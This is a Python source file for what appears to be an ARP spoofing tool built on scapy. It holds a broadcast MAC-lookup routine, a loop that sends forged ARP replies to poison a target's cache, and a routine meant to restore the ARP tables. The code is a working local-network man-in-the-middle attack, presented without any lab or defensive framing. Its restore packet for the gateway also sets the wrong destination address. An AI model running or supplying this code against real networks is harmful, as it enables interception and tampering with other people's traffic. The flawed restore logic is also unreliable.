from threading import Event
from scapy.all import Ether,ARP,sendp,srp
from time import sleep
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
yellow=Fore.YELLOW
red=Fore.RED
green=Fore.GREEN
reset=Style.RESET_ALL
stop_event=Event()

def get_mac_addr(ip):
    # Function to get mac address from given ip.
    try:
        ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet=ARP(pdst=ip)
        sent_packet=ether_frame/arp_packet
        
        try:
            answer,unanswer=srp(sent_packet,verbose=False,timeout=2)
            try:
                if answer[0]:
                    return answer[0].answer.src
                else:
                    return None
            
            except IndexError:
                    print(f"{bright}{yellow} [+] {reset}{red}Invalid ip: {reset}{blue}Verify the ip is alive and in the same network{reset}")
                    exit(1)  
                
        except Exception as e:
            print(f"{bright}{yellow} [+] {reset}{red}Unexpected Mac resolution Error:{e}")
            exit(1) 
      
    except Exception as e:
        print(f"{bright}{yellow} [+] {reset}{red}Unexpected get_mac_addr Error:{e}")
        return None
    
def spoof_restorer(target_ip,target_mac,gateway_ip,gateway_mac,interface):
    # Funtion to restore spoofed arp table(both target and gateway) to back its original.
    for packet in range(1,6):
        sleep(0.2)
        try:
            target_arp_restore_rpacket = Ether(dst=target_mac) / ARP(op=2,
                                                                     psrc=gateway_ip,
                                                                     hwsrc=gateway_mac,
                                                                     hwdst=target_mac,
                                                                     pdst=target_ip
                                                                     )
            
            sendp(target_arp_restore_rpacket,iface=interface,verbose=False)
            
            gateway_arp_restore_rpacket=Ether(dst=gateway_mac)/ARP(op=2,
                                                                   psrc=target_ip,
                                                                   hwsrc=target_mac,
                                                                   hwdst=gateway_mac,
                                                                   pdst=target_ip
                                                                   )
            sendp(gateway_arp_restore_rpacket,iface=interface,verbose=False)
        except TypeError:
            pass    
        
        except Exception as e:
            print(f"{bright}{yellow} [+] {reset}{red}Unexpected Spoof restorer Error:{e}")
            break    
        
    print(f"{bright}{yellow}\n [+] {reset}{blue}Target restoration {bright}status: {green}Done{reset}")
    print(f"{bright}{yellow} [+] {reset}{blue}Gateway restoration {bright}status: {green}Done{reset}")    
    
def arp_spoofer(target_ip,target_mac,spoof_ip,interface):
    # Function to create spoofed replay_packet sent.
    while not stop_event.is_set():
        try:
            arp_rpacket = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
            sendp(arp_rpacket,iface=interface,verbose=False)
            sleep(0.1)
            
        except Exception as e:
            print(f"{bright}{yellow} [+] {reset}{red}Unexpected Spoofing Error:{e}")
            break